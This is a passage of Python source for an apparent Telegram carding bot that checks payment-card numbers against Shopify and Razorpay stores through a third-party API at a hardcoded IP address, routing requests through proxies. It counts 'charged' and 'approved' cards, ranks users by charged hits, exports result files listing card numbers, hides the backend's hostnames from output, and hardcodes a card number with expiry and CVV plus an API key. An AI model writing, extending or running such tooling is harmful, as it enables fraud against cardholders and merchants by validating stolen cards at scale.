        os.remove(txt_file)

    # ✅ RESULT MESSAGE
    if is_admin(user_id):
        buttons = [
            [
                Button.inline(f"🟢 MY SITES ({len(get_user_sites_sync(user_id))})", b"use_my_sites", style="success"),
                Button.inline(f"🔵 BOT SITES ({len(load_sites())})", b"use_global", style="primary"),
            ],
            [
                Button.inline("CLEAR MY SITES", b"clear_my_sites", style="danger"),
            ]
        ]
        
        await msg.edit(premium_emoji(f"""<b>✅ Site Check Complete</b>

👤 <b>Mode:</b> Admin (Both)
📊 <b>Total Checked:</b> <code>{len(sites)}</code>
✅ <b>Working:</b> <code>{len(alive)}</code>
❌ <b>Dead:</b> <code>{dead}</code>  👈 FIXED: dead is int
📄 <b>TXT File Sent</b> ✅

<b>👇 Choose which sites to use for checking:</b>"""), buttons=buttons, parse_mode="html")
    
    else:
        user_count = len(get_user_sites_sync(user_id))
        
        await msg.edit(premium_emoji(f"""<b>✅ Site Check Complete</b>

👤 <b>Mode:</b> Your Sites
📊 <b>Total Checked:</b> <code>{len(sites)}</code>
✅ <b>Working:</b> <code>{len(alive)}</code>
❌ <b>Dead:</b> <code>{dead}</code>  👈 FIXED: dead is int
📄 <b>TXT File Sent</b> ✅
━━━━━━━━━━━━━━━━━━━━
📌 <b>Your Sites:</b> <code>{user_count}</code>
💡 <code>/addsites url</code> | <code>/mysites</code>"""), parse_mode="html")
# ==================== BUTTON HANDLERS ====================
@bot.on(events.CallbackQuery(data=b"use_my_sites"))
async def use_my_sites_handler(event):
    user_id = event.sender_id
    user_sites = get_user_sites_sync(user_id)
    if user_sites:
        await event.answer(f"✅ Using YOUR {len(user_sites)} sites!", alert=True)
    else:
        await event.answer("❌ No personal sites! Using bot sites.", alert=True)


@bot.on(events.CallbackQuery(data=b"use_global"))
async def use_global_handler(event):
    global_sites = load_sites()
    await event.answer("✅ Using BOT SITES!", alert=True)


@bot.on(events.CallbackQuery(data=b"clear_my_sites"))
async def clear_my_sites_handler(event):
    user_id = event.sender_id
    count = len(get_user_sites_sync(user_id))
    if count > 0:
        await clear_user_sites(user_id)
        await event.answer(f"✅ Cleared {count} sites!", alert=True)  # ✅ Missing tha
    else:
        await event.answer("❌ No sites to clear!", alert=True)  # ✅ Ye bhi add karo



# ==================== CHECKER USES USER SITES FIRST ====================
def get_checker_sites(user_id):
    """Pehle user ki personal sites, nahi to global sites.txt"""
    user_sites = get_user_sites_sync(user_id)
    if user_sites:
        return user_sites
    return load_sites()
    
# ==================== /addsite ====================
@bot.on(events.NewMessage(pattern=r'^/addsite\s+(.+)'))
async def user_add_site(event):
    user_id = event.sender_id

    site = event.pattern_match.group(1).strip()
    if not site.startswith("http"):
        site = f"https://{site}"

    status_msg = await event.reply(premium_emoji(f"🔄 Testing Site...\n\n<code>{site[:60]}</code>"), parse_mode="html")
    
    proxies = load_proxies()  # ✅ DIRECT proxy.txt SE LOAD  # ✅ User ki apni proxies
    if not proxies:
        await status_msg.edit(premium_emoji("/addproxy add your proxy | ❌ No proxies available! Use /addproxy first."), parse_mode="html")
        return
    
    proxy = random.choice(proxies)
    test_card = "5154623245618097|03|2032|156"
    url = f"http://85.90.216.140/duler/shopify?site={site}&cc={test_card}&proxy={proxy}"
    
    try:
        timeout = aiohttp.ClientTimeout(total=40, connect=20, sock_read=40)
        async with aiohttp.ClientSession(timeout=timeout) as session:
            async with session.get(url) as resp:
                raw = await resp.json(content_type=None)
        
        response_msg = str(raw.get('Response', '')).lower()
        price = raw.get('Price', '-')
        
        if is_dead_site_error(response_msg):
            await status_msg.edit(premium_emoji(f"❌ Site Dead! Not Added.\n\n<code>{site[:60]}</code>"), parse_mode="html")
            return
        
        if await add_user_site(user_id, site):
            new_count = len(get_user_sites_sync(user_id))
            await status_msg.edit(premium_emoji(f"""✅ Site Added to Your List!

📊 Your Sites: <code>{new_count}</code>
💰 Price: <code>{price}</code>

💡 /mysites - View | /rm url - Remove"""), parse_mode="html")
        else:
            await status_msg.edit(premium_emoji("⚠️ Already in your list!"), parse_mode="html")
            
    except:
        await status_msg.edit(premium_emoji("❌ Test Failed! Not Added."), parse_mode="html")


# ==================== /rm ====================
@bot.on(events.NewMessage(pattern=r'^/rm\s+(.+)'))
async def remove_user_site_cmd(event):
    user_id = event.sender_id
    site_to_remove = event.pattern_match.group(1).strip()
    
    if not site_to_remove.startswith("http"):
        site_to_remove = f"https://{site_to_remove}"
    
    user_sites = get_user_sites_sync(user_id)
    
    if not user_sites:
        await event.reply(premium_emoji("❌ No sites in your list!\nUse /addsite url to add."), parse_mode="html")
        return
    
    found = None
    for s in user_sites:
        if site_to_remove in s or s in site_to_remove:
            found = s
            break
    
    target = found if found else site_to_remove
    
    if target not in user_sites:
        await event.reply(premium_emoji("❌ Site not found!\n\nUse /mysites to view your sites."), parse_mode="html")
        return
    
    await remove_user_site(user_id, target)
    remaining = len(get_user_sites_sync(user_id))
    
    await event.reply(premium_emoji(f"""✅ Site Removed!

🗑 <code>{target[:50]}</code>
📊 Remaining: <code>{remaining}</code>

💡 /addsite url | /mysites"""), parse_mode="html")


# ==================== /mysites ====================


@bot.on(events.NewMessage(pattern='/testapis'))
async def test_all_apis(event):
    if not is_owner(event.sender_id):
        await event.reply(premium_emoji("\u274c **Access Denied**\n\nOnly the owner can use API tests."))
        return
    t0 = time.time()
    status_msg = await event.reply(premium_emoji("\u23f3 **Testing all 25 APIs (Turbo)...**"))
    results, working, dead = await _fast_api_check_all()
    elapsed = round(time.time() - t0, 1)
    final_msg = f"""<b>\u26a1 API STATUS CHECK \u26a1</b>
\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501
{chr(10).join(results)}
\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501
<b>\U0001F4CA SUMMARY</b>
\u2705 Working: <code>{working}</code>
\u274c Dead: <code>{dead}</code>
\u23f1 Time: <code>{elapsed}s (\u26a1 Turbo)</code>
\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501"""
    try:
        await status_msg.edit(premium_emoji(final_msg), parse_mode="html")
    except Exception:
        await event.reply(premium_emoji(final_msg), parse_mode="html")

# ==================== /clearsites ====================
@bot.on(events.NewMessage(pattern=r'^/clearsites$'))
async def clear_user_sites_cmd(event):
    user_id = event.sender_id
    user_sites = get_user_sites_sync(user_id)
    
    if not user_sites:
        await event.reply(premium_emoji("❌ No sites to clear!"), parse_mode="html")
        return
    
    count = len(user_sites)
    timestamp = datetime.now(pytz.timezone('Asia/Kolkata')).strftime("%Y%m%d_%H%M%S")
    backup_file = f"sites_backup_{user_id}_{timestamp}.txt"
    with open(backup_file, "w") as f:
        for s in user_sites:
            f.write(f"{s}\n")
    
    await clear_user_sites(user_id)
    await event.reply(premium_emoji(f"✅ Cleared {count} sites! Backup attached."), file=backup_file)
    try: os.remove(backup_file)
    except: pass


# ==================== /site ====================



# ==================== /addrzsites - RAZORPAY SITE ADD ====================
@bot.on(events.NewMessage(pattern=r'^/addrzsites\s+(.+)'))
async def add_razorpay_site(event):
    user_id = event.sender_id

    site = event.pattern_match.group(1).strip()
    if not site.startswith("http"):
        site = f"https://{site}"

    status_msg = await event.reply(premium_emoji(f"🔄 Testing Razorpay Site...\n\n<code>{site[:60]}</code>"), parse_mode="html")
    
    proxies = load_proxies()  # ✅ DIRECT proxy.txt SE LOAD  # ✅ User ki apni proxies
    if not proxies:
        await status_msg.edit(premium_emoji("/addproxy add your proxy | ❌ No proxies available!"))
        return
    
    proxy = random.choice(proxies)
    test_card = "5154623245618097|03|2032|156"
    
    try:
        # ✅ RAZORPAY API TEST
        base_url = f"{RAZORPAY_API_BASE}?Key=aiojames&Site={site}&amount=1&cc={test_card}"
        
        timeout = aiohttp.ClientTimeout(total=40, connect=20, sock_read=40)
        async with aiohttp.ClientSession(timeout=timeout) as session:
            async with session.get(base_url, ssl=False) as resp:
                raw_text = await resp.text()
                
                if not raw_text or len(raw_text) < 10:
                    await status_msg.edit(premium_emoji("❌ RZ Site Dead! Empty Response."), parse_mode="html")
                    return
                
                try:
                    raw = json.loads(raw_text)
                except:
                    await status_msg.edit(premium_emoji("❌ RZ Site Dead! Invalid Response."), parse_mode="html")
                    return
                
                response_msg = str(raw.get('response', raw.get('Response', ''))).lower()
                
                dead_indicators = ['error', 'invalid', 'dead', 'failed', 'timeout', 'not found', 'bad gateway', 'cloudflare', 'captcha', 'connection', 'refused']
                
                if any(x in response_msg for x in dead_indicators):
                    await status_msg.edit(premium_emoji(f"❌ RZ Site Dead!\n\n<code>{site[:60]}</code>"), parse_mode="html")
                    return
                
                # ✅ ADD TO RZ SITES FILE
                current_rz = get_file_lines(RZ_SITES_FILE)
                if site not in current_rz:
                    async with aiofiles.open(RZ_SITES_FILE, 'a') as f:
                        await f.write(f"{site}\n")
                    await status_msg.edit(premium_emoji(f"""✅ Razorpay Site Added!

📊 Total RZ Sites: <code>{len(current_rz) + 1}</code>

💡 /rzsites - Check | /rmrzsites url - Remove"""), parse_mode="html")
                else:
                    await status_msg.edit(premium_emoji("⚠️ Already in RZ list!"), parse_mode="html")
                    
    except:
        await status_msg.edit(premium_emoji("❌ Test Failed! Not Added."), parse_mode="html")

        
# ==================== /rmrzsites - RAZORPAY SITE REMOVE ====================
@bot.on(events.NewMessage(pattern=r'^/rmrzsites\s+(.+)'))
async def remove_razorpay_site(event):
    user_id = event.sender_id
    site_to_remove = event.pattern_match.group(1).strip()
    
    if not site_to_remove.startswith("http"):
        site_to_remove = f"https://{site_to_remove}"
    
    current_rz = get_file_lines(RZ_SITES_FILE)
    
    if not current_rz:
        await event.reply(premium_emoji("❌ No Razorpay sites found!\nUse /addrzsites url to add."), parse_mode="html")
        return
    
    found = None
    for s in current_rz:
        if site_to_remove in s or s in site_to_remove:
            found = s
            break
    
    target = found if found else site_to_remove
    
    if target not in current_rz:
        await event.reply(premium_emoji("❌ Site not found in RZ list!\n\nUse /rzsites to view all."), parse_mode="html")
        return
    
    new_rz = [s for s in current_rz if s != target]
    async with aiofiles.open(RZ_SITES_FILE, 'w') as f:
        for s in new_rz:
            await f.write(f"{s}\n")
    
    await event.reply(premium_emoji(f"""✅ Razorpay Site Removed!

🗑 <code>{target[:50]}</code>
📊 Remaining: <code>{len(new_rz)}</code>

💡 /addrzsites url | /rzsites"""), parse_mode="html")

@bot.on(events.NewMessage(pattern='/stats'))
async def stats_command(event):
    user_id = event.sender_id
    
    data = load_hits()
    
    try:
        conn = sqlite3.connect('users.db')
        cursor = conn.cursor()
        cursor.execute("SELECT COUNT(*) FROM users")
        total_users = cursor.fetchone()[0]
        conn.close()
    except:
        total_users = len(data.get('users', {}))
    
    total_charged = data.get('total_charged', 0)
    total_approved = data.get('total_approved', 0)
    total_declined = data.get('total_declined', 0)
    total_checks = total_charged + total_approved + total_declined
    
    msg = f"""<b>📊 𝗕𝗢𝗧 𝗦𝗧𝗔𝗧𝗦</b>
━━━━━━━━━━━━━━━━━━━━
🔥 <b>𝗧𝗼𝘁𝗮𝗹 𝗨𝘀𝗲𝗿𝘀:</b> <code>{total_users:,}</code>
⚡ <b>𝗧𝗼𝘁𝗮𝗹 𝗖𝗵𝗲𝗰𝗸𝗲𝗱:</b> <code>{total_checks:,}</code>
━━━━━━━━━━━━━━━━━━━━
💎 <b>𝗧𝗼𝘁𝗮𝗹 𝗖𝗵𝗮𝗿𝗴𝗲𝗱:</b> <code>{total_charged:,}</code>
✅ <b>𝗧𝗼𝘁𝗮𝗹 𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱:</b> <code>{total_approved:,}</code>
❌ <b>𝗧𝗼𝘁𝗮𝗹 𝗗𝗲𝗰𝗹𝗶𝗻𝗲𝗱:</b> <code>{total_declined:,}</code>
━━━━━━━━━━━━━━━━━━━━
🏆 <b>𝗧𝗼𝗽 𝗨𝘀𝗲𝗿𝘀:</b>"""

    users_data = data.get('users', {})
    
    filtered_users = {
        uid: udata for uid, udata in users_data.items()
        if udata.get('charged', 0) > 0
    }
    sorted_users = sorted(filtered_users.items(), key=lambda x: x[1].get('charged', 0), reverse=True)[:3]  # ✅ SIRF TOP 3
    
    medals = ["🥇", "🥈", "🥉"]
    
    if not sorted_users:
        msg += "\n❌ No charged hits yet!"
    else:
        for idx, (uid, udata) in enumerate(sorted_users, 1):
            charged = udata.get('charged', 0)
            
            try:
                entity = await bot.get_entity(int(uid))
                name = entity.first_name or "Unknown"
                username = entity.username or ""
                display = f"@{username}" if username else name[:15]
            except:
                display = f"User_{uid[:6]}"
            
            medal = medals[idx-1]  # ✅ idx 1,2,3 ke liye medals
            
            msg += f"\n{medal} {display} → <code>{charged}</code> 💎"

    msg += f"\n━━━━━━━━━━━━━━━━━━━━\n🤖 <b>Bot By:</b> ⧼ 𝗗𝗲𝗳𝗳⁺⁺ ⧽ QURESHIxOTP"

    await event.reply(premium_emoji(msg), parse_mode="html")
    
@bot.on(events.NewMessage(pattern='/me'))
async def me_command(event):
    user_id = event.sender_id
    
    try:
        sender = await event.get_sender()
        first_name = sender.first_name or "User"
    except:
        first_name = "User"
    
    data = load_hits()
    user_data = data.get('users', {}).get(str(user_id), {})
    
    charged = user_data.get('charged', 0)
    approved = user_data.get('approved', 0)
    declined = user_data.get('declined', 0)
    total = user_data.get('total', 0)
    
    if is_admin(user_id):
        plan_emoji = "👑"
        plan_text = "Admin"
    elif is_premium(user_id):
        plan_emoji = "💎"
        plan_text = "Premium"
    else:
        plan_emoji = "⭐"
        plan_text = "Free"
    
    msg = f"""<b>⚡ 𝗬𝗢𝗨𝗥 𝗦𝗧𝗔𝗧𝗦</b>
━━━━━━━━━━━━━━━━━━━━
🔥 𝗨𝘀𝗲𝗿: <a href="tg://user?id={user_id}">{first_name}</a>
⭐ 𝗣𝗹𝗮𝗻: {plan_emoji} {plan_text}
━━━━━━━━━━━━━━━━━━━━
✅ 𝗧𝗼𝘁𝗮𝗹 𝗖𝗵𝗲𝗰𝗸𝗲𝗱: <code>{total:,}</code>
💎 𝗧𝗼𝘁𝗮𝗹 𝗖𝗵𝗮𝗿𝗴𝗲𝗱: <code>{charged:,}</code>
✅ 𝗧𝗼𝘁𝗮𝗹 𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱: <code>{approved:,}</code>
❌ 𝗧𝗼𝘁𝗮𝗹 𝗗𝗲𝗰𝗹𝗶𝗻𝗲𝗱: <code>{declined:,}</code>
━━━━━━━━━━━━━━━━━━━━
🤖 𝗗𝗲𝘃: Admin"""

    await event.reply(premium_emoji(msg), parse_mode="html")
    

# ==================== /rzsites - CHECK RAZORPAY SITES ====================
@bot.on(events.NewMessage(pattern=r'^/rzsites$'))
async def rz_sites_check(event):
    user_id = event.sender_id    
    sites = get_file_lines(RZ_SITES_FILE)
    proxies = load_proxies()  # ✅ DIRECT proxy.txt SE LOAD  # ✅ User ki apni proxies
    
    if not sites:
        await event.reply(premium_emoji("❌ No Razorpay sites in rz_sites.txt\nUse /addrzsites url to add."))
        return
    
    if not proxies:
        await event.reply(premium_emoji("❌ No proxies."))
        return

    msg = await event.reply(premium_emoji(f"""<b>⚡ RZ Site Checker</b>

📊 Total Sites: <code>{len(sites)}</code>
🔍 Testing with Razorpay API...
"""), parse_mode="html")

    alive = []
    dead = []
    checked = 0
    test_card = "5154623245618097|03|2032|156"
    
    for site in sites:
        checked += 1
        proxy = random.choice(proxies)
        
        try:
            base_url = f"{RAZORPAY_API_BASE}?Key=aiojames&Site={site}&amount=1&cc={test_card}"
            
            timeout = aiohttp.ClientTimeout(total=20)
            async with aiohttp.ClientSession(timeout=timeout) as session:
                async with session.get(base_url, ssl=False) as resp:
                    raw_text = await resp.text()
                    
                    if not raw_text or len(raw_text) < 10:
                        dead.append(site)
                        continue
                    
                    try:
                        raw = json.loads(raw_text)
                    except:
                        dead.append(site)
                        continue
                    
                    response_msg = str(raw.get('response', raw.get('Response', ''))).lower()
                    
                    dead_indicators = ['error', 'invalid', 'dead', 'failed', 'timeout', 'not found', 'bad gateway', 'cloudflare', 'captcha', 'site not supported', 'connection', 'refused']
                    
                    if any(x in response_msg for x in dead_indicators):
                        dead.append(site)
                    else:
                        alive.append(site)
                        
        except:
            dead.append(site)
        
        if checked % 5 == 0 or checked == len(sites):
            try:
                await msg.edit(premium_emoji(f"""<b>⚡ RZ Site Checker</b>

📊 Total: <code>{len(sites)}</code>
✅ Working: <code>{len(alive)}</code>
❌ Dead: <code>{len(dead)}</code>
🔄 Checked: <code>{checked}/{len(sites)}</code>"""), parse_mode="html")
            except: pass

    if alive:
        txt_file = "working_rz_sites.txt"
        with open(txt_file, "w") as f:
            for s in alive:
                if not s.startswith("http"):
                    s = "https://" + s
                f.write(s + "\n")
        await bot.send_message(user_id, f"📄 **{len(alive)} Working RZ Sites**", file=txt_file)
        os.remove(txt_file)

    await msg.edit(premium_emoji(f"""<b>✅ RZ Site Check Complete</b>

📊 Total: <code>{len(sites)}</code>
✅ Working: <code>{len(alive)}</code>
❌ Dead: <code>{len(dead)}</code>
📄 TXT File Sent ✅"""), parse_mode="html")

# ==================== /proxy ====================

@bot.on(events.NewMessage(pattern='/getproxy'))
async def get_proxies(event):
    user_id = event.sender_id

    proxies = load_proxies()  # ✅ DIRECT proxy.txt SE LOAD  # ✅ await lagaya
    if not proxies:
        await event.reply(premium_emoji("❌ No proxies in your list."))
        return

    if len(proxies) <= 50:
        proxy_list = "\n".join([f"{i+1}. <code>{p}</code>" for i, p in enumerate(proxies)])
        await event.reply(premium_emoji(f"📋 **Your Proxies ({len(proxies)}):**\n\n{proxy_list}"), parse_mode="html")
    else:
        timestamp = datetime.now(pytz.timezone('Asia/Kolkata')).strftime("%Y%m%d_%H%M%S")
        filename = f"proxies_{user_id}_{timestamp}.txt"
        with open(filename, "w") as f:
            for proxy in proxies:
                f.write(f"{proxy}\n")
        await event.reply(premium_emoji(f"📋 **Your Proxies ({len(proxies)}):**"), file=filename)
        try: os.remove(filename)
        except: pass
# ==================== BLOCK USER ====================
@bot.on(events.NewMessage(pattern=r'^/block\s+(\d+)'))
async def block_user_cmd(event):
    user_id = event.sender_id
    
    # ✅ Check if admin
    if user_id not in KEY_ADMINS:
        await event.reply(premium_emoji("<b>❌ ᴏɴʟʏ ᴀᴅᴍɪɴs ᴄᴀɴ ᴜsᴇ ᴛʜɪs ᴄᴏᴍᴍᴀɴᴅ!</b>"), parse_mode="html")
        return
    
    try:
        target_id = int(event.pattern_match.group(1))
    except:
        await event.reply(premium_emoji("<b>❌ ᴜsᴀɢᴇ:</b> <code>/block USER_ID</code>\n\n<b>💡 ᴇxᴀᴍᴘʟᴇ:</b> <code>/block 123456789</code>"), parse_mode="html")
        return
    
    if target_id == user_id:
        await event.reply(premium_emoji("<b>❌ ᴀᴘɴᴇ ᴀᴀᴘ ᴋᴏ ʙʟᴏᴄᴋ ɴᴀʜɪ ᴋᴀʀ sᴀᴋᴛᴇ! 😆</b>"), parse_mode="html")
        return
    
    if target_id in KEY_ADMINS:
        await event.reply(premium_emoji("<b>❌ ᴀᴅᴍɪɴ ᴋᴏ ʙʟᴏᴄᴋ ɴᴀʜɪ ᴋᴀʀ sᴀᴋᴛᴇ!</b>"), parse_mode="html")
        return
    
    if is_blocked(target_id):
        await event.reply(premium_emoji(f"<b>⚠️ ᴜsᴇʀ <code>{target_id}</code> ᴀʟʀᴇᴀᴅʏ ʙʟᴏᴄᴋᴇᴅ ʜᴀɪ!</b>"), parse_mode="html")
        return
    
    block_user(target_id)
    
    await event.reply(premium_emoji(f"""<b>🚫 ᴜsᴇʀ ʙʟᴏᴄᴋᴇᴅ sᴜᴄᴄᴇssꜰᴜʟʟʏ! 🚫</b>
━━━━━━━━━━━━━━━━━━━━
<b>🆔 ʙʟᴏᴄᴋᴇᴅ ɪᴅ:</b> <code>{target_id}</code>
<b>👑 ʙʟᴏᴄᴋᴇᴅ ʙʏ:</b> <a href="tg://user?id={user_id}">ᴀᴅᴍɪɴ</a>
━━━━━━━━━━━━━━━━━━━━
<b>💡 ᴜɴʙʟᴏᴄᴋ:</b> <code>/unblock {target_id}</code>
<b>📋 ʙʟᴏᴄᴋᴇᴅ ʟɪsᴛ:</b> <code>/blocklist</code>"""), parse_mode="html")


# ==================== UNBLOCK USER ====================
@bot.on(events.NewMessage(pattern=r'^/unblock\s+(\d+)'))
async def unblock_user_cmd(event):
    user_id = event.sender_id
    
    # ✅ Check if admin
    if user_id not in KEY_ADMINS:
        await event.reply(premium_emoji("<b>❌ ᴏɴʟʏ ᴀᴅᴍɪɴs ᴄᴀɴ ᴜsᴇ ᴛʜɪs ᴄᴏᴍᴍᴀɴᴅ!</b>"), parse_mode="html")
        return
    
    try:
        target_id = int(event.pattern_match.group(1))
    except:
        await event.reply(premium_emoji("<b>❌ ᴜsᴀɢᴇ:</b> <code>/unblock USER_ID</code>\n\n<b>💡 ᴇxᴀᴍᴘʟᴇ:</b> <code>/unblock 123456789</code>"), parse_mode="html")
        return
    
    if not is_blocked(target_id):
        await event.reply(premium_emoji(f"<b>⚠️ ᴜsᴇʀ <code>{target_id}</code> ʙʟᴏᴄᴋᴇᴅ ɴᴀʜɪ ʜᴀɪ!</b>"), parse_mode="html")
        return
    
    unblock_user(target_id)
    
    await event.reply(premium_emoji(f"""<b>✅ ᴜsᴇʀ ᴜɴʙʟᴏᴄᴋᴇᴅ sᴜᴄᴄᴇssꜰᴜʟʟʏ! ✅</b>
━━━━━━━━━━━━━━━━━━━━
<b>🆔 ᴜɴʙʟᴏᴄᴋᴇᴅ ɪᴅ:</b> <code>{target_id}</code>
<b>👑 ᴜɴʙʟᴏᴄᴋᴇᴅ ʙʏ:</b> <a href="tg://user?id={user_id}">ᴀᴅᴍɪɴ</a>
━━━━━━━━━━━━━━━━━━━━
<b>📋 ʙʟᴏᴄᴋᴇᴅ ʟɪsᴛ:</b> <code>/blocklist</code>"""), parse_mode="html")


# ==================== BLOCK LIST ====================
@bot.on(events.NewMessage(pattern=r'^/blocklist$'))
async def block_list_cmd(event):
    user_id = event.sender_id
    
    if user_id not in KEY_ADMINS:
        await event.reply(premium_emoji("<b>❌ ᴏɴʟʏ ᴀᴅᴍɪɴs ᴄᴀɴ ᴜsᴇ ᴛʜɪs ᴄᴏᴍᴍᴀɴᴅ!</b>"), parse_mode="html")
        return
    
    blocked = get_blocked_users()
    
    if not blocked:
        await event.reply(premium_emoji("<b>📋 ʙʟᴏᴄᴋᴇᴅ ʟɪsᴛ ɪs ᴇᴍᴘᴛʏ!</b>\n\n<b>✅ ɴᴏ ᴜsᴇʀs ʙʟᴏᴄᴋᴇᴅ.</b>"), parse_mode="html")
        return
    
    blocked_text = "\n".join([f"<code>{uid}</code>" for uid in blocked])
    
    msg = f"""<b>🚫 ʙʟᴏᴄᴋᴇᴅ ᴜsᴇʀs ʟɪsᴛ 🚫</b>
━━━━━━━━━━━━━━━━━━━━
<b>📊 ᴛᴏᴛᴀʟ ʙʟᴏᴄᴋᴇᴅ:</b> {len(blocked)}

{blocked_text}
━━━━━━━━━━━━━━━━━━━━
<b>🔓 ᴜɴʙʟᴏᴄᴋ:</b> <code>/unblock USER_ID</code>"""

    await event.reply(premium_emoji(msg), parse_mode="html")
    
@bot.on(events.NewMessage(pattern=r'^/myproxies$'))
async def view_user_proxies(event):
    user_id = event.sender_id
    proxies = load_proxies()  # ✅ DIRECT proxy.txt SE LOAD  # ✅ await

    if not proxies:
        await event.reply("📭 **No proxies in your list.**\n\nUse `/addproxy ip:port` to add.")
        return

    proxy_list = "\n".join([f"{i+1}. `{p}`" for i, p in enumerate(proxies)])
    await event.reply(f"📋 **Your Proxies ({len(proxies)}):**\n\n{proxy_list}")
    
async def send_final_results(chat_id, results):
    """✅ Sirf 1 file bhejo - API HIDE, SITE FULL, RESPONSE FULL + API ERROR COUNT"""
    if not results or not isinstance(results, dict):
        results = {'charged': [], 'approved': [], 'dead': [], 'error_cards': [], 'api_errors': 0, 'errors': 0, 'total': 0, 'start_time': time.time()}
    
    if 'start_time' not in results:
        results['start_time'] = time.time()
    
    error_count = len(results.get('error_cards', []))
    api_error_count = results.get('api_errors', 0)
    
    if 'total' not in results:
        results['total'] = len(results.get('charged', [])) + len(results.get('approved', [])) + len(results.get('dead', [])) + error_count

    elapsed = int(time.time() - results['start_time'])
    hours = elapsed // 3600
    minutes = (elapsed % 3600) // 60
    seconds = elapsed % 60

    # ✅ USER INFO ADD KARO - HAR CARD MEIN
    try:
        sender = await bot.get_entity(chat_id)
        first_name = sender.first_name or "User"
        username = sender.username or ""
    except:
        first_name = "User"
        username = ""

    # ✅ ADD USER INFO TO ALL CARDS
    for card_type in ['charged', 'approved', 'dead', 'error_cards']:
        for card in results.get(card_type, []):
            if 'first_name' not in card:
                card['first_name'] = first_name
            if 'username' not in card:
                card['username'] = username

    hits_text = ""
    if results.get('charged'):
        for r in results['charged'][:5]:
            hits_text += f"✅ <code>{r['card']}</code>\n"
    if results.get('approved'):
        for r in results['approved'][:5]:
            hits_text += f"🔥 <code>{r['card']}</code>\n"

    if not hits_text:
        hits_text = "No hits found"
    
    gateway = "𝘼𝙪𝙩𝙤 𝙎𝙝𝙤𝙥𝙞𝙛𝙮"
    price = "0.00"
    
    if results.get("charged"):
        gateway = results["charged"][0].get("gateway", "𝘼𝙪𝙩𝙤 𝙎𝙝𝙤𝙥𝙞𝙛𝙮")
        price = results["charged"][0].get("price", "-")
    elif results.get("approved"):
        gateway = results["approved"][0].get("gateway", "𝘼𝙪𝙩𝙤 𝙎𝙝𝙤𝙥𝙞𝙛𝙮")
        price = results["approved"][0].get("price", "-")

    summary = f"""<b>⚡💳 ㅤ𝘼𝙪𝙩𝙤 𝙎𝙝𝙤𝙥𝙞𝙛𝙮 💳⚡</b>
<b>━━━━━━━━━━━━━━━━━</b>
<b>⚡💠 𝐑𝐞𝐬𝐮𝐥𝐭𝐬</b>
<blockquote>💳 Total: {results.get('total', 0)} | ✅ Charged: {len(results.get('charged', []))} | 🔥 Live: {len(results.get('approved', []))} | ❌ Dead: {len(results.get('dead', []))} | ⚠️ Error: {error_count} | ⚠️ API Error: {api_error_count}</blockquote>
<blockquote>🌐 𝗚𝗮𝘁𝙚𝙬𝙖𝙮 ⇾ 🔥 {gateway} | 💰 {price}</blockquote> 
<blockquote>⏱️ Time: {hours}h {minutes}m {seconds}s</blockquote>
<b>━━━━━━━━━━━━━━━━━</b>
<b>🎯💠 𝐇𝐢𝐭𝐬</b>
<blockquote>{hits_text}</blockquote>
<b>━━━━━━━━━━━━━━━━━</b>

🤖 <b>Bot By: ⧼ 𝗗𝗲𝗳𝗳⁺⁺ ⧽ QURESHIxOTP</b>"""

    timestamp = datetime.now(pytz.timezone('Asia/Kolkata')).strftime("%Y%m%d_%H%M%S")
    filename = f"Checker_Result_{chat_id}_{timestamp}.txt"

    # ✅ CLEAN RESPONSE HELPER
    def clean_msg(msg):
        if not msg:
            return 'Unknown'
        msg_str = str(msg)
        if 'http' in msg_str or '.vercel.app' in msg_str or '.railway.app' in msg_str or '.up.railway.app' in msg_str:
            return 'API Response'
        if 'PAYMENTS_CREDIT_CARD' in msg_str:
            msg_str = msg_str.replace('PAYMENTS_CREDIT_CARD', '').strip()
            if not msg_str:
                return 'API Response'
        if msg_str in ['PAYMENTS_CREDIT_CARD', 'shopify', 'Shopify', 'SHOPIFY', 'credit_card']:
            return 'API Response'
        return msg_str[:100]

    async with aiofiles.open(filename, 'w', encoding='utf-8') as f:
        await f.write("=" * 70 + "\n")
        await f.write("⚡💳 CC CHECKER FINAL RESULTS 💳⚡\n")
        await f.write("=" * 70 + "\n\n")
        
        await f.write(f"📊 SUMMARY\n")
        await f.write(f"Total Cards: {results.get('total', 0)}\n")
        await f.write(f"✅ Charged: {len(results.get('charged', []))}\n")
        await f.write(f"🔥 Approved: {len(results.get('approved', []))}\n")
        await f.write(f"❌ Dead: {len(results.get('dead', []))}\n")
        await f.write(f"⚠️ Errors: {error_count}\n")
        await f.write(f"⚠️ API Errors: {api_error_count}\n")
        await f.write(f"⏱️ Time: {hours}h {minutes}m {seconds}s\n")
        await f.write(f"🌐 Gateway: {gateway}\n")
        await f.write(f"💰 Price: {price}\n")
        await f.write("=" * 70 + "\n\n")

        if results.get('charged'):
            await f.write(f"✅ CHARGED ({len(results.get('charged', []))}):\n")
            await f.write("-" * 70 + "\n")
            for r in results.get('charged', []):
                msg = clean_msg(r.get('message', ''))
                await f.write(f"{r.get('card', '')} | {r.get('gateway', 'Auto Shopify')} | {r.get('price', '-')} | {msg}\n")
            await f.write("\n")

        if results.get('approved'):
            await f.write(f"🔥 APPROVED ({len(results.get('approved', []))}):\n")
            await f.write("-" * 70 + "\n")
            for r in results.get('approved', []):
                msg = clean_msg(r.get('message', ''))
                await f.write(f"{r.get('card', '')} | {r.get('gateway', 'Auto Shopify')} | {r.get('price', '-')} | {msg}\n")
            await f.write("\n")

        if results.get('dead'):
            await f.write(f"❌ DEAD ({len(results.get('dead', []))}):\n")
            await f.write("-" * 70 + "\n")
            for r in results.get('dead', []):
                msg = clean_msg(r.get('message', ''))
                await f.write(f"{r.get('card', '')} | {r.get('gateway', '')} | {r.get('price', '-')} | {msg}\n")
            await f.write("\n")

        error_cards = results.get('error_cards', [])
        if error_cards:
            await f.write(f"⚠️ ERRORS ({len(error_cards)}):\n")
            await f.write("-" * 70 + "\n")
            for r in error_cards:
                msg = clean_msg(r.get('message', 'Unknown Error'))
                await f.write(f"{r.get('card', '')} | {r.get('gateway', '')} | {r.get('price', '-')} | {msg}\n")

    try:
